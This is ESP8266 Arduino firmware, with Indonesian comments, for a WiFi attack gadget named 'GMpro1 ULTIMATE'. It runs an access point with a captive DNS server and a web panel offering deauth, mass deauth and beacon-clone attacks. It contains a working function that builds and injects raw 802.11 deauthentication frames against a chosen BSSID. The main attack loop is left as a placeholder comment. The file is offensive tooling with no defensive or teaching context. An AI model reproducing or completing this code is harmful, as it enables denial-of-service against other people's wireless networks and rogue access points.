#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
  #include "user_interface.h"
}

DNSServer dnsServer;
ESP8266WebServer server(80);

String _logs = "[SYSTEM] GMpro1 Integrated Ready\n";
bool isAttacking = false;
String attackType = "IDLE";

// TAMPILAN HTML MASUK KE SINI (DIBUNGKUS JADI SATU BIN)
const char INDEX_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #0f4; font-family: monospace; padding: 10px; text-shadow: 0 0 5px #0f4; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .btn { padding: 15px; border: 1px solid #0f4; background: #000; color: #0f4; text-align: center; font-weight: bold; cursor: pointer; text-decoration: none; display: block; }
        .btn-red { background: #f00; color: #fff; border: none; }
        .btn-orange { background: #f90; color: #000; border: none; }
        .btn-blue { background: #05f; color: #fff; border: none; }
        pre { background: #111; border: 1px solid #333; padding: 10px; height: 150px; overflow-y: scroll; font-size: 10px; color: #0f4; white-space: pre-wrap; }
    </style>
</head>
<body>
    <h2 style="text-align:center">GMpro1 <span style="color:red">ULTIMATE</span></h2>
    <div class="grid">
        <div class="btn btn-red" onclick="location.href='/attack?type=deauth'">DEAUTH</div>
        <div class="btn" onclick="location.href='/attack?type=mass_deauth'">MASS DEAUTH</div>
        <div class="btn btn-orange" onclick="location.href='/stop'">STOP ACTIVE!</div>
        <div class="btn btn-blue" onclick="location.href='/attack?type=clone'">BEACON CLONE</div>
    </div>
    <h4>CRITICAL LOGS</h4>
    <pre id="logs">Wait...</pre>
    <script>
        setInterval(() => {
            fetch('/get_logs').then(r => r.text()).then(t => { document.getElementById('logs').innerText = t; });
        }, 2000);
    </script>
</body>
</html>
)=====";

void sendDeauth(uint8_t* bssid) {
  uint8_t packet[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
  for(int i=0; i<6; i++) { packet[10+i] = packet[16+i] = bssid[i]; }
  wifi_send_pkt_freedom(packet, 26, 0);
}

void setup() {
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("GMpro1", "sangkur87");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  server.on("/", []() { server.send_P(200, "text/html", INDEX_HTML); });
  server.on("/get_logs", []() { server.send(200, "text/plain", _logs); });
  server.on("/stop", []() { isAttacking = false; _logs = "[STOP] All Clear\n" + _logs; server.sendHeader("Location", "/"); server.send(302); });
  server.on("/attack", []() {
    attackType = server.arg("type");
    isAttacking = true;
    _logs = "[START] " + attackType + "\n" + _logs;
    server.sendHeader("Location", "/");
    server.send(302);
  });
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  if (isAttacking) {
    // Logika serangan berjalan di sini
    delay(1); 
  }
}
